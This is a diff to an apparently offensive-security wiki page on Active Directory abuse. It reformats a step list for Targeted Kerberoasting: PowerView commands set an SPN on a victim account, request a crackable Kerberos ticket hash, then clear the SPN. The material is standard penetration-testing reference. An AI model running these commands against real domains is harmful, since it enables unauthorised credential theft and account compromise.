@@ -120,16 +120,17 @@ This abuse can be carried out when controlling an object that has a GenericAll, 
 
 The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.
 
+**Windows**
 1. Make sur that the target account has no SPN
-Get-DomainUser 'victimuser' | Select serviceprincipalname
+- Get-DomainUser 'victimuser' | Select serviceprincipalname
 
 2. Set the SPN
-Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
+- Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
 3. Obtain a kerberoast hash
-$User = Get-DomainUser 'victimuser'
-$User | Get-DomainSPNTicket | fl
+- $User = Get-DomainUser 'victimuser'
+- $User | Get-DomainSPNTicket | fl
 
 4. Clear the SPNs of the target account
-$User | Select serviceprincipalname
-Set-DomainObject -Identity victimuser -Clear serviceprincipalname
+- $User | Select serviceprincipalname
+- Set-DomainObject -Identity victimuser -Clear serviceprincipalname
